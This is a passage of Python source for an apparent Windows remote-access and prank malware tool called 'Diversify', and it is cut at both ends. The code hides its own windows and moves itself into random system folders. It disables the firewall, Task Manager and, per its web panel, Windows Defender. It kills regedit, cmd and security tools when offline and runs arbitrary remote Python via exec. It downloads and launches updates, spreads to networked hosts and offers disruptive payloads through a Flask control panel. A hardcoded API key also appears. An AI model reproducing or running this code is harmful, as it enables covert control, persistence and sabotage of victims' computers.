    """Hides the script's UI from the user."""
    [hide_process_via_pid(i) for i in get_process_connected_pids(os.getpid())]

def restart_explorer():
    """Restarts Windows Explorer."""
    runcmd("taskkill /f /im explorer.exe")
    runcmd("explorer.exe", retry=4)

def get_username_os():
    """Gets the username of the current user."""
    return os.getlogin()

def get_random_folder():
    """Gets a random folder from a list of possible locations."""
    if admin_privileges:
        folders = [
            "C:\ProgramData",
            "C:\Windows",
            "C:\Windows\System32"
        ]
    else:
        username = get_username_os()
        folders = [
            f"C:\\Users\\{username}\\AppData\\Local",
            f"C:\\Users\\{username}\\AppData\\LocalLow",
            f"C:\\Users\\{username}\\AppData\\Roaming",
            f"C:\\Users\\{username}\\Documents"
        ]
    all_folders = []
    for i in folders:
        for x in os.listdir(i):
            if not x.startswith('.') and not x.endswith('.ini'): # To avoid hidden folders and .ini files
                all_folders.append(os.path.join(i, x))
    all_actual_folders = [i for i in all_folders if os.path.isdir(i) and " " not in i]
    if all_actual_folders:
        chosen = random.choice(all_actual_folders)
        return chosen
    else:
        print("No suitable folders found in the specified directories.")
        return None

def win_on_click_play_sound(x, y, button, pressed, stop_event):
    """Plays a system sound on mouse clicks."""
    if stop_event.is_set():
        return False 
    if pressed and button in (pynput.mouse.Button.left, pynput.mouse.Button.right, pynput.mouse.Button.middle):
        winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)

def windows_lag_click_sound(stop_event):
    """Starts a listener for mouse clicks and plays a sound on each click."""
    print("Enabling click sound")
    with pynput.mouse.Listener(on_click=lambda x, y, button, pressed: win_on_click_play_sound(x, y, button, pressed, stop_event)) as listener:
        listener.join()

def enable_windows_lag_click_sound():
    """Enables the click sound feature."""
    global winlag_thread
    if not stop_event_windowslag.is_set():
        print('Click sound is already enabled')
        return
    stop_event_windowslag.clear()
    print('Enabling click sound')
    winlag_thread = threading.Thread(target=windows_lag_click_sound, args=(stop_event_windowslag,))
    winlag_thread.start()

def disable_windows_lag_click_sound():
    """Disables the click sound feature."""
    stop_event_windowslag.set()
    try:
        winlag_thread.join()
    except:
        pass

def send_all_hosts_a_todo(todo, identifier=None, settingIP=None):
    """Sends a task to all connected Diversify hosts."""
    splitter = "XR~=3yy=[W2vc%L"
    if identifier is None:
        identifier = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    buildup = fr"REQUESTSENDALLHOSTCONTINUEONMESSAGE{splitter}{socket.gethostbyname(socket.gethostname())}{splitter}{identifier}{splitter}{todo}"
    done_vary_tasks.append(identifier)
    sendAllVaryHosts(buildup)

def isIn(name, list): 
    """Checks if a string is present in a list of strings."""
    return any(name.lower() in i.lower() for i in list)

def kill_self():
    """Kills the script and all its related processes."""
    [runcmd(f'taskkill /f /t /PID {i}') for i in get_process_connected_pids(os.getppid())]
    runcmd(f'taskkill /f /t /PID {os.getpid()}')

def reset_network():
    """Resets the network settings."""
    runcmd('ipconfig /release')
    runcmd('ipconfig /renew')
    runcmd('ipconfig /flushdns')
    runcmd('netsh winsock reset')
    runcmd('netsh int ip reset')
    runcmd('netsh advfirewall reset')
    runcmd('netsh firewall reset')
    runcmd('netsh int tcp set heuristics disabled')
    runcmd('netsh int tcp set global autotuninglevel=normal')
    runcmd('netsh int tcp set global rss=enabled')
    runcmd('netsh int tcp show global')

def disablefirewall():
    """Disables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state off', True)
    runcmd('netsh firewall set notifications mode=disable profile=all', True)

def bypassfirewall():
    """Bypasses the firewall for the script."""
    exe_path = os.path.join(get_script_directory(), get_script_filename())
    cmd = f'netsh advfirewall firewall add rule name="x32dbg" dir=in action=allow program="{exe_path}" enable=yes'
    programVL2(cmd)
    restart_self()

def enablefirewall():
    """Enables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state on', True)

def restartToADvancedOptions():
    """Restarts the computer to Advanced Startup Options."""
    programVL2('shutdown.exe /r /o /f /t 0')

def disableTaskmanager():
    """Disables the Windows Task Manager."""
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def enabletaskmgr():
    """Enables the Windows Task Manager."""
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')

def runpythonscript(text):
    """Executes Python code from a string."""
    try:
        exec(text)
        print('Succesfully ran code')
    except Exception as e:
        print(f'Error while running python code:\n{e}')
        return e

def check_and_kill_self(SERVER1, port_to):
    """Checks if the script is already running and kills the existing instance."""
    self_path = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    print(f"{self_path} <- self variable")
    print('requested port to check: ' + str(port_to))

    def corruptfile(directoryoffile):
        """Corrupts a file by overwriting its content."""
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()
            
    try:
        ADDR = (SERVER1, port_to)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)        
        server.listen()
        server.close()
        server.detach()
        return "rn"
    except Exception as e:
        print(f'Error: {e}')
        pids_tocheck_ofself = get_process_connected_pids(get_own_parent_process_pid())
        for proc in psutil.process_iter():
            try:
                if proc.pid in pids_tocheck_ofself:
                    continue
                if len(proc.cmdline()) > 1:
                    vrsproc = proc.cmdline()[1]
                else:
                    vrsproc = proc.cmdline()[0]
                print(f'Name: {proc.name()}, equal to self {proc.name().casefold() == get_script_filename().casefold()}, location equal: {proc.name().casefold() == get_script_filename().casefold()}')
                if proc.name().casefold() == get_script_filename().casefold() and self_path.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                    return 'ks'
                elif proc.name().casefold() == get_script_filename().casefold():
                    [i.kill() for i in proc.children()]
                    proc.kill()
                    slp(0.4)
                    runcmd(f'taskkill /f /t /PID {proc.ppid}')
                    corruptfile(vrsproc.lower())
            except Exception as e:
                pass
        try:
            slp(3)
            ADDR = (SERVER1, port_to)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(ADDR)
            server.listen()
            server.close()
            server.detach()
            return "rn"
        except Exception as e:
            print(f'Error1: {e}')
            terminate_unknown_processes()
            try:
                slp(6)
                ADDR = (SERVER1, port_to)
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind(ADDR)
                server.listen()
                server.close()
                server.detach()
                return "rn"
            except Exception as e:
                print(f'Error2: {e}')
                reset_network()
                runcmd('shutdown.exe /g /t 0')

def autokillunknownprocesses():
    """Automatically kills unknown processes."""
    global autoterminateunknownexeprocesses
    if autoterminateunknownexeprocesses:
        print('terminating unknown processes')
        terminate_unknown_processes(corrupt=False)
    threading.Timer(8.0, autokillunknownprocesses).start()

def autofreezeunknownprocesses_func():
    """Automatically freezes unknown processes."""
    global autofreezeunknownprocesses
    if autofreezeunknownprocesses:
        print('freezing unknown processes')
        freeze_unknown_processes()
    threading.Timer(8.0, autofreezeunknownprocesses_func).start()

timer1_forautokill = threading.Timer(8.0, autokillunknownprocesses)  
timer2_forautofreeze = threading.Timer(8.0, autofreezeunknownprocesses_func)  
timer1_forautokill.start()
timer2_forautofreeze.start()
    
def procKill(name):
    """Kills a process by its name."""
    if '.' not in name:
        name += ".exe"
    try:
        runcmd('taskkill /f /im ' + name)
    except:
        pass

def SmartAssNoInternet():
    """Implements behavior when the internet connection is lost."""
    global INTERNET, run_win_click_exclamation, autofreezeunknownprocesses, SmartAssNoInternet_isenabled
    wastriggedduetonointernet = False
    AmountOfTimeWithoutInternet_check = 0
    AmountOfTimeInSecondsWithoutInternet = 0
    previousTime = 0
    
    def resetback():
        """Resets variables and behavior."""
        global AmountOfTimeWithoutInternet_check, AmountOfTimeInSecondsWithoutInternet, previousTime, wastriggedduetonointernet
        AmountOfTimeWithoutInternet_check = 0
        AmountOfTimeInSecondsWithoutInternet = 0
        autofreezeunknownprocesses = False
        if GetSystemMetrics(SM_SWAPBUTTON):
            swapRMBAndLMB(False)
        previousTime = time.time()
        disable_windows_lag_click_sound()
        try:
            unfreeze_all_processes()
        except:
            pass
        wastriggedduetonointernet = False
    
    while True:
        if SmartAssNoInternet_isenabled:
            if INTERNET and wastriggedduetonointernet:
                resetback()
                wastriggedduetonointernet = False
                print('resetting SmartAssNoInternet behavior as internet is back on.')
            elif INTERNET and not wastriggedduetonointernet:
                time.sleep(10)
            else:
                wastriggedduetonointernet = True
                autofreezeunknownprocesses = True
                if AmountOfTimeWithoutInternet_check == 0:
                    AmountOfTimeWithoutInternet_check = time.time()
                else:
                    AmountOfTimeInSecondsWithoutInternet = time.time() - AmountOfTimeWithoutInternet_check
                if previousTime == round(time.time()):
                    continue
                else:
                    previousTime = round(time.time())
                if round(AmountOfTimeInSecondsWithoutInternet) == 10:
                    enable_windows_lag_click_sound()
                print(f"Amount of time without internet: {AmountOfTimeInSecondsWithoutInternet} seconds")
                if AmountOfTimeInSecondsWithoutInternet > 2:
                    list_of_process_names = []
                    [list_of_process_names.append(i.name()) for i in psutil.process_iter()]
                    if isIn("systemsettings.exe", list_of_process_names):
                        procKill("systemsettings")
                    if isIn("SecHealthUI.exe", list_of_process_names):
                        procKill("SecHealthUI.exe")
                    if isIn("Taskmgr.exe", list_of_process_names):
                        procKill("Taskmgr.exe")
                    if isIn("regedit.exe", list_of_process_names):
                        procKill("regedit.exe")
                    if isIn("cmd.exe", list_of_process_names):
                        procKill("cmd.exe")
                    if round(AmountOfTimeInSecondsWithoutInternet) % 4 == 1:
                        swapRMBAndLMB()
        else:
            if wastriggedduetonointernet:
                resetback()
                wastriggedduetonointernet = False
                print('resetting SmartAssNoInternet behavior as internet is back on.')
            time.sleep(10)

def set_volume(volume):
    """Sets the system volume."""
    pythoncom.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volumeInterface = cast(interface, POINTER(IAudioEndpointVolume))
    newVolume = max(0.0, min(1.0, float(volume) / 100.0))
    volumeInterface.SetMasterVolumeLevelScalar(newVolume, None)
    pythoncom.CoInitialize()

def updateselfViaLink(url):
    """Updates the script from a given URL."""
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    splitter = "ym3NY8c35NY"
    currentFilename = get_script_filename()
    extension = currentFilename.split(".")[-1]
    new_filename = f"{random_string}{splitter}{currentFilename}".split(".")[0] + "." + extension
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}, stream=True)
        print('downloading?')
        if response.status_code == 200:
            with open(new_filename, 'wb') as file:
                file.write(response.content)
            print("Downloaded new version successfully!")
        else:
            print(f"Failed to download file. Status code: {response.status_code}")
            return "failed"
    except Exception as e:
        print(f"Failed to download file: {e}")
        return "failed"
    cmd = f"start cmd /k \"{os.path.join(os.getcwd(), new_filename)} update\""
    print(f'cmd: {cmd}')
    os.system(cmd)
    kill_self()

def find_file_with_string(search_string):
    """Finds a file containing a specific string in its name."""
    with os.scandir('.') as entries:
        for entry in entries:
            if entry.is_file() and search_string in entry.name:
                return True, os.path.abspath(entry)
    return False, None

def handle_update():
    """Handles the script update process."""
    splitter = "ym3NY8c35NY"
    self_filename = get_script_filename()
    if splitter in self_filename:
        oldfile = self_filename.split(splitter)[1] 
    else:
        return
    new_filename = os.path.join(get_script_directory(), oldfile).replace("\"", "").replace("\'", "") 
    try:
        runcmd(f'del {new_filename} /f')
    except Exception as e:
        print(f'Failed to delete the following file: {new_filename}')
    renameSELF(new_filename)
    handle_tostart_sequences()

def renameSELF(ToWhat):
    """Renames the script file."""
    extension = get_script_filename().split(".")[-1]
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    if "." not in ToWhat:
        ToWhat = ToWhat + "." + extension    
    if ToWhat == get_script_filename():
        return "Given name is already set to Filename"
    ToWhat_FileNameOnly = os.path.basename(ToWhat)
    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
ren "{os.path.join(get_script_directory(), get_script_filename())}" "{ToWhat_FileNameOnly}"
"{os.path.join(get_script_directory(), ToWhat)}" delFile "{os.path.join(get_script_directory(), random_string)}" ren"
    """
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
        cmd_file.write(cmd_content)
    runcmd("start " + os.path.join(get_script_directory(), random_string))
    kill_self()

def get_hwnds_for_pid(pid):
    """Gets a list of window handles for a given process ID."""
    def callback(hwnd, hwnds):
        """Callback function for EnumWindows."""
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True
    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    return hwnds

def set_always_on_top_via_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)

    if hwnds:
        for hwnd in hwnds:
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        print(f"Set {len(hwnds)} windows to always on top for PID {pid}")
    else:
        print(f"No visible windows found for PID {pid}")

def set_always_on_top_via_name(name):
    for pid in get_pids_for_process_name(name):
        set_always_on_top_via_pid(pid)
    
def unset_always_on_top_by_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True

    hwnds = []
    win32gui.EnumWindows(callback, hwnds)

    if hwnds:
        for hwnd in hwnds:
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, 
                                  win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        print(f"Unset always on top for {len(hwnds)} windows of PID {pid}")
    else:
        print(f"No visible windows found for PID {pid}")
        
def unset_always_on_top_by_name(name):
    """Unsets always on top for a process by its name."""
    for pid in get_pids_for_process_name(name):
        unset_always_on_top_by_pid(pid)
    
def maximize_process_via_pid(pid):
    """Maximizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
        win32gui.SetForegroundWindow(hwnd)

def get_pids_for_process_name(process_name):
    """Returns a list of PIDs for a given process name."""
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name().lower() == process_name.lower():
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return pids

def hide_process_via_name(name):
    """Hides a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        hide_process_via_pid(pid)

def show_process_via_name(name):
     # Initialize COM for this thread
    pythoncom.CoInitialize()

    def enum_windows_callback(hwnd, result):
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            process = psutil.Process(pid)
            if process.name().lower() == name.lower():
                title = win32gui.GetWindowText(hwnd)
                if title:  # Only include windows with a title
                    result.append((hwnd, title))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
        return True

    try:
        windows = []
        win32gui.EnumWindows(enum_windows_callback, windows)

        if not windows:
            print(f"No windows found for process: {name}")
            return

        shell = win32com.client.Dispatch("Shell.Application")

        for hwnd, title in windows:
            try:
                print(f"Attempting to show window: '{title}' (handle: {hwnd})")

                # Make the window visible first
                win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
                
                # Try to restore the window if it's minimized
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                
                # Bring the window to the foreground
                win32gui.SetForegroundWindow(hwnd)
                
                win32gui.SetForegroundWindow(hwnd)
                
                print(f"Successfully showed window: '{title}' (handle: {hwnd})")
            except Exception as e:
                print(f"Error showing window '{title}' (handle: {hwnd}): {str(e)}")

        print("Finished attempting to show hidden windows.")

    finally:
        # Uninitialize COM when we're done
        pythoncom.CoUninitialize()

# def show_process_via_pid(pid):
#     """Shows a process from background by its PID."""
#     hwnds = get_hwnds_for_pid(pid)
#     for hwnd in hwnds:
#         # Make the window visible first
#             win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
            
#             # Try to restore the window if it's minimized
#             win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            
#             # Bring the window to the foreground
#             win32gui.SetForegroundWindow(hwnd)
            
 
#             win32gui.SetForegroundWindow(hwnd)
 
# def show_process_via_name(name):
#     """Shows a process from background by its name."""
#     pids = get_pids_for_process_name(name)
#     for pid in pids:
#         show_process_via_pid(pid)
    
def maximize_process_via_pid(pid):
    """Maximizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)    

def maximize_process_via_name(name):
    """Maximizes a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        maximize_process_via_pid(pid)
    
def minimize_process_via_pid(pid):
    """Minimizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_FORCEMINIMIZE)
    
def minimize_process_via_name(name):
    """Minimizes a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        minimize_process_via_pid(pid)

def hide_process_via_pid(pid):
    """Hides a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        
def get_process_name_from_pid(pid):
    """Returns the process name for a given PID.""" 
    return psutil.Process(pid).name()

def get_parent_process_name_from_pid(pid):
    """Returns the parent process name for a given PID."""
    return psutil.Process(pid).parent().name()

def get_own_parent_process_pid():
    """Returns the PID of the parent process."""
    return os.getppid()

def freeze_all_processes():
    """Freezes all processes except for essential system processes."""
    pids_tocheck = get_process_connected_pids(get_own_parent_process_pid())
    tonotfreeze = [
        "System", "OpenConsole.exe", "MemCompression", "wlms.exe", 'svchost.exe', 
        'dwm.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'Registry', 'TrustedInstaller.exe', 
        'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 
        'System Idle Process', 'conhost.exe', 'SearchProtocolHost.exe', 
        'SearchIndexer.exe','System','services.exe', 'taskkill.exe'
    ]
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name() in tonotfreeze:
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
            print(f'Error while freezing: {e}')
    pids_tocheck.extend(pids)

    for i in psutil.process_iter():
        try:
            if i.pid in pids_tocheck:
                continue
            print(f'Suspending {i.name()}')
            i.suspend()
        except:
            pass
        
def unfreeze_all_processes():
    """Unfreezes all processes."""
    for i in psutil.process_iter():
        try:
            i.resume()
        except:
            pass
        

def restart_self():
    """Restarts the script."""
    runcmd(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    runcmd('taskkill /f /im cmd.exe', retry=3) 
    kill_self()

def moveToFolder(ToWhere="Random"):
    """Moves the script to a specified folder."""
    if ToWhere.casefold() == "Random".casefold():
        ToWhere = get_random_folder()
    if " " in ToWhere:
        ToWhere = get_random_folder()
        while " " in ToWhere:
            ToWhere = get_random_folder()
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
robocopy "{get_script_directory()}" "{ToWhere}" "{get_script_filename()}" /Z
ping 127.0.0.1 -n 1 > nul
del /f /q "{os.path.join(get_script_directory(), get_script_filename())}"
start cmd /k \"{os.path.join(ToWhere, get_script_filename())} delFile {os.path.join(get_script_directory(), random_string)} ren\"
    """
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
        cmd_file.write(cmd_content)
    runcmd("start " + os.path.join(get_script_directory(), random_string))
    kill_self()

def is_system_user():
    """Checks if the script is running as the SYSTEM user."""
    token_info = ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 2, 1)
    sid_type = ctypes.c_ubyte()
    sid_size = ctypes.c_ulong(0)
    sid_data = ctypes.create_string_buffer(sid_size.value) 
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), 0, ctypes.byref(sid_size))
    sid_size = ctypes.c_ulong(sid_size.value)
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), sid_size, ctypes.byref(sid_size))
    ctypes.windll.advapi32.GetSidSubAuthorityCount(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)))
    ctypes.windll.advapi32.GetSidSubAuthority(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)), 1)
    return sid_type.value == 18

def disableUWF():
    """Disables the Unified Write Filter."""
    programVL2('DISM /online /disable-feature /featurename:Client-UnifiedWriteFilter')
    programVL2('uwfmgr.exe filter disable')
    runcmd('shutdown.exe /g /t 0')

def enableUWF():
    """Enables the Unified Write Filter."""
    programVL2('DISM /online /enable-feature /featurename:Client-UnifiedWriteFilter')
    programVL2('uwfmgr.exe filter enable')
    runcmd('shutdown.exe /g /t 0')

def websiteUI():
    """Runs a Flask web UI for controlling Diversify."""
    print(f'Initializing UI...')
    app = Flask(__name__, static_folder='./')
    socketio = SocketIO(app, async_mode='gevent')
    thread_scan_network = None
    last_response_from_clientUI = None
    newresponse = None
    currentSelectedIPV4 = None

    def get_street_address(lat, lon):
        """Gets the street address from latitude and longitude."""
        geolocator = Photon(user_agent="myGeocoder", timeout=10, proxies={"http": None, "https": None})
        location = geolocator.reverse([lat, lon], exactly_one=True)
        return location.address

    def get_weather_description(weather_description):
        """Converts a weather description to a more user-friendly format."""
        weather_map = {
            "clear sky": "clear skies",
            "few clouds": "some clouds",
            "scattered clouds": "a few clouds",
            "broken clouds": "mostly cloudy",
            "overcast clouds": "overcast",
            "shower rain": "showers",
            "rain": "rain",
            "thunderstorm": "thunderstorms",
            "snow": "snow",
            "mist": "mist",
            "smoke": "smoke",
            "haze": "haze",
            "dust": "dust",
            "fog": "fog",
            "sand": "sand",
            "ash": "ash",
            "squalls": "squalls",
            "tornado": "a tornado"
        }
        return weather_map.get(weather_description, weather_description)

    def generate_weather_greeting(location):
        """Generates a greeting message with weather information."""
        response = requests.get(f'http://api.openweathermap.org/data/2.5/weather?lat={location[0]}&lon={location[1]}&units=metric&appid=a8bcf85c1ac14fc50ea17311d710be30')
        data = response.json()
        temperature = round(data['main']['temp'])
        humidity = data['main']['humidity']
        wind_speed = data['wind']['speed']
        precipitation = data['clouds']['all'] / 100
        weather_description = data['weather'][0]['description'].lower()
        now = datetime.now()
        hour = now.hour
        if 5 <= hour < 12:
            greeting = "Good morning"
        elif 12 <= hour < 18:
            greeting = "Good afternoon"
        else:
            greeting = "Good evening"
        weather_phrase = get_weather_description(weather_description)
        condition = "Enjoy your day!"
        if weather_phrase in ["showers", "rain"]:
            condition = f"Grab your umbrella! It's going to be {weather_phrase}."
        elif weather_phrase == "thunderstorms":
            condition = "Stay safe indoors, as there are expected thunderstorms."
        elif weather_phrase == "snow":
            condition = "Get ready for a winter wonderland! It's snowing."
        elif weather_phrase == "mist":
            condition = "Expect misty conditions, be cautious while driving."
        elif weather_phrase == "dust":
            condition = "Dusty conditions prevail. Drive carefully and protect your eyes."
        wind_description = f"Expect a {wind_speed} m/s breeze." if wind_speed > 1 else ""
        precipitation_description = f"Anticipate {round(precipitation * 100)}% chance of precipitation." if precipitation > 0 else ""
        heat_description = "It's going to be hot and humid. Stay hydrated." if temperature > 30 and humidity > 70 else ""
        welcome = f"{greeting},<br>The current weather is {weather_phrase}. {condition}<br>Temperature: {temperature}°C | Humidity: {humidity}%<br>{wind_description} {precipitation_description} {heat_description}"
        return welcome

    @app.route('/', methods=['GET'])
    def index():
        """Renders the index page of the web UI."""
        location = geocoder.ip('me').latlng
        try:
            street_address = get_street_address(location[0], location[1])
        except:
            street_address = "Unknown, Failed fetching info"
        console = ""
        function_descriptions = {
            'installchrome': 'Install Chrome',
            'corrupttaskmgr': 'Corrupt Task Manager',
            'corruptmmc': 'Corrupt Management Console',
            'corruptregedit': 'Corrupt Registry Editor',
            'corruptdllhost': 'Corrupt DLL Host',
            'corruptsfc': 'Corrupt System File Checker',
            'corruptsystemreset': 'Corrupt System Reset',
            'screenoff': 'Screen Off',
            'disableUserAccountControl': 'Disable User Account Control',
            'enableUserAccountControl': 'Enable User Account Control',
            'swapRMBAndLMB': 'Swap Right Mouse Button And Left Mouse Button',
            'DisableWindowsDefender': 'Disable Windows Defender',
            'EnableWindowsDefender': 'Enable Windows Defender',
            'disableresetoptions': 'Disable Reset Options',
            'enableresetoptions': 'Enable Reset Options',
            'restartToUAC': 'Restart Script To Obtain UAC',
            'terminate_unknown_processes': 'Terminate Unknown Processes',
            'restart_explorer': 'Restart Explorer',
            'reset_network': 'Reset Network',
            'disablefirewall': 'Disable Firewall',
            'enablefirewall': 'Enable Firewall',
            'restartToADvancedOptions': 'Restart To Advanced Options',
            'disableTaskmanager': 'Disable Task Manager',
            'enabletaskmgr': 'Enable Task Manager',
            'freeze_all_processes': 'Freeze All Processes',
            'unfreeze_all_processes': 'Unfreeze All Processes',
            'restart_self': 'Restart Self',
            'disableUWF': 'Disable Unified Write Filter',
            'enableUWF': 'Enable Unified Write Filter',
            'installdiversify': 'Deploy Diversify',
        }
        greeting_text = generate_weather_greeting(location)
        console = ""
        local_ip = socket.gethostbyname(socket.gethostname())
        tool_list = [{'name': func, 'desc': desc} for func, desc in function_descriptions.items()]
        categories = [
            {
                'name': 'Stuff..',
                'buttons': [
                    {'name': 'Open website', 'placeholder': 'Enter the URL of the website you wish'},
                    {'name': 'Text to speech', 'placeholder': 'Text to speech, deep male voice, English only'},
                    {'name': 'Speak in a language', 'placeholder': 'Hear any language (except Hebrew) by writing in it'},
                    {'name': 'Play frequency', 'placeholder': 'Formatted as HZ:Duration-in-milliseconds'},
                    {'name': 'Play Shepard tone', 'placeholder': 'Formatted as \"StartHZ:EndHZ:Duration-in-seconds\"'},
                    {'name': 'Restart Explorer'},
                    {'name': 'Download And Install Chrome'}
                ]
            },
            {
                'name': 'Display Manipulation',
                'buttons': [
                    {'name': 'Send to background highlight', 'placeholder': 'Explanation: The app that the computer user will click on will be hidden.'},
                    {'name': 'Turn the Screen black', 'placeholder': 'For how long? Duration in seconds'},
                    {'name': 'Make the screen rotate', 'placeholder': 'For how long to do the rotations? (seconds)'},
                    {'name': 'Flip screen: upsidedown'},
                    {'name': 'Flip screen: right'},
                    {'name': 'Flip screen: normal'},
                    {'name': 'Flip screen: left'},
                    {'name': 'payload1'},
                    {'name': 'payload2'},
                    {'name': 'payload3'},
                    {'name': 'payload4'},
                    {'name': 'payload5'},
                    {'name': 'payload6'}
                ]
            },
            {
                'name': 'System Control',
                'buttons': [
                    {'name': 'Per click, lag windows (Enable)'},
                    {'name': 'Per click, lag windows (Disable)'},
                    {'name': 'Swap RMB and LMB'},
                    {'name': 'Unswap RMB and LMB'},
                    {'name': 'enablekeyboard'},
                    {'name': 'disablekeyboard'},
                    {'name': 'enablemouse'},
                    {'name': 'disablemouse'}
                ]
            },
            {
                'name': 'Miscellaneous/Fun',
                'buttons': [
                    {'name': 'Me and the boys!'},
                    {'name': 'presskeys', 'placeholder': 'Press keys in Windows, combinations go as "key+key+key"'},
                    {'name': 'writetext', 'placeholder': 'Type text'},
                    {'name': 'Type a String like a human', 'placeholder': 'Type at the speed of a human'}
                ]
            }
        ]
        print(f'ADDRESS REMOTE: {request.remote_addr}')
        global prioritizeipv4
        if prioritizeipv4 is not None:
            try:
                ip_of_client = request.remote_addr
                if ip_of_client not in prioritizeipv4:
                    return False
            except Exception as e:
                print(f'Error in prioritizeipv4 handling of WEBUI: {e}')
        return render_template('index.html', welcome=greeting_text, categories=categories)

    @app.route('/submit', methods=['POST'])
    def submit():
        """Handles button clicks from the web UI."""
        button = request.form.get('button')
        client_id = request.remote_addr
        print(f'Client ID: {client_id}')
        print(f'Button pressed: {button}')
        try:
            threading.Thread(target=handle_button_click, args=(button, client_id)).start()
        except Exception as e:
            print(f'Error in creating a thread for handle button click: {e}')
        return ''

    clients = {}

    @socketio.on('connect')
    def handle_connect():
        """Handles socket connections."""
        ip_address = request.remote_addr
        clients[ip_address] = request.sid

    def handle_button_click(button_name, client_id):
        """Handles button click events from the web UI."""
        print(f"Button clicked by client: {client_id}")
        print(f"Button clicked: {button_name}")
        text = None
        if button_name.endswith('_buttonnotextfield'):
            print(f'Clicked button with no textfield: {button_name}')
        else:
            try: 
                print('trying to obtain response')
                text = requestValue(button_name.replace('_button', '_textfield'), client_id)
            except Exception as e:
                print(f'Error in requestValue: {e}') 
                text = ""
            if text == "" or text is None:
                text = None
        global prioritizeipv4
        if prioritizeipv4 is not None:
            try:
                ip_of_client = client_id
                if ip_of_client not in prioritizeipv4:
